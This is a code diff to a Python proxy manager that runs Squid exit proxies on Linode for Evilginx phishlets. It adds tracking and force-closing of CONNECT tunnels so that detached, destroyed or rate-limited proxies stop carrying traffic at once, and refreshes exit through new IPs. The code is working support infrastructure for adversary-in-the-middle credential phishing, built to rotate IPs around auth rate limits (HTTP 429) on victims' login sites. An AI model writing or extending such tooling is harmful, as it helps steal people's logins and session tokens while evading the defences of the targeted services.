@@ -31,6 +31,8 @@ _notify = None  # fn(title, message, ntype)
 _used_mem = {}
 _used_dirty = False
 _used_flushed = 0.0
+_tunnels = []
+_tunnels_lock = threading.Lock()
 
 
 def init(settings_path, phishlets_dir, egx_config_path, notify_fn):
@@ -394,6 +396,56 @@ def _as_id(x):
         return x
 
 
+def _track_tunnel(px_id, *socks):
+    rec = {"px_id": _as_id(px_id) if px_id is not None else None, "socks": socks}
+    with _tunnels_lock:
+        _tunnels.append(rec)
+    return rec
+
+
+def _untrack_tunnel(rec):
+    if not rec:
+        return
+    with _tunnels_lock:
+        try:
+            _tunnels.remove(rec)
+        except ValueError:
+            pass
+
+
+def drop_proxy_tunnels(linode_ids):
+    """Force-close live sidecar CONNECT tunnels for these Linode ids.
+
+    Evilginx reuses idle upstreams. Detach only updated JSON before; the
+    Squid hop stayed up until idle timeout, so refresh still used the old IP.
+    """
+    drop = {_as_id(i) for i in (linode_ids or []) if i is not None}
+    if not drop:
+        return 0
+    doomed = []
+    with _tunnels_lock:
+        keep = []
+        for rec in _tunnels:
+            if rec.get("px_id") in drop:
+                doomed.append(rec)
+            else:
+                keep.append(rec)
+        _tunnels[:] = keep
+    for rec in doomed:
+        for s in rec.get("socks") or []:
+            if s is None:
+                continue
+            try:
+                s.shutdown(socket.SHUT_RDWR)
+            except Exception:
+                pass
+            try:
+                s.close()
+            except Exception:
+                pass
+    return len(doomed)
+
+
 def pick_proxy(origin_host):
     s = load()
     pl = domain_to_phishlet(origin_host)
@@ -498,6 +550,7 @@ def record_auth_429(phishlet, host="", path=""):
         s.setdefault("current", {})[pl] = nxt
         s["hits"][key] = []
         save(s)
+        drop_proxy_tunnels([px_id])
 
         dead = rec
         ip = (dead or {}).get("ipv4") or str(px_id)
@@ -609,6 +662,9 @@ def detach(phishlet, linode_ids):
         if cur in drop or cur not in assigned:
             s.setdefault("current", {})[phishlet] = assigned[0] if assigned else None
         save(s)
+    # Kill live CONNECT tunnels through the detached Squid(s). Otherwise Evilginx
+    # keeps the idle upstream and refresh still exits via the old proxy IP.
+    drop_proxy_tunnels(drop)
     return public_state()
 
 
@@ -630,6 +686,7 @@ def destroy_instance(linode_id):
         if (s.get("current") or {}).get(pl) == linode_id:
             s["current"][pl] = (s["assignments"][pl][0] if s["assignments"][pl] else None)
     save(s)
+    drop_proxy_tunnels([linode_id])
     if _notify:
         _notify("Proxy destroyed", f"Linode {linode_id} deleted by user.", "info")
     return public_state()
@@ -1046,6 +1103,7 @@ class _Sidecar(threading.Thread):
 
     def _client(self, client):
         remote = None
+        track = None
         try:
             client.settimeout(20)
             buf = b""
@@ -1070,6 +1128,7 @@ class _Sidecar(threading.Thread):
             px = pick_proxy(host)
             pl = domain_to_phishlet(host)
             px_id = (px or {}).get("id")
+            track = None
             if px and px.get("ipv4"):
                 remote = socket.create_connection((px["ipv4"], int(px.get("port") or SQUID_PORT)), 12)
                 token = base64.b64encode(f"{px.get('squid_user','')}:{px.get('squid_pass','')}".encode()).decode()
@@ -1090,6 +1149,7 @@ class _Sidecar(threading.Thread):
             else:
                 remote = socket.create_connection((host, port), 12)
                 client.sendall(b"HTTP/1.1 200 Connection Established\r\n\r\n")
+            track = _track_tunnel(px_id, client, remote)
             client.settimeout(None)
             remote.settimeout(None)
             done = threading.Event()
@@ -1138,6 +1198,7 @@ class _Sidecar(threading.Thread):
             except Exception:
                 pass
         finally:
+            _untrack_tunnel(track)
             for x in (client, remote):
                 try:
                     x.close()
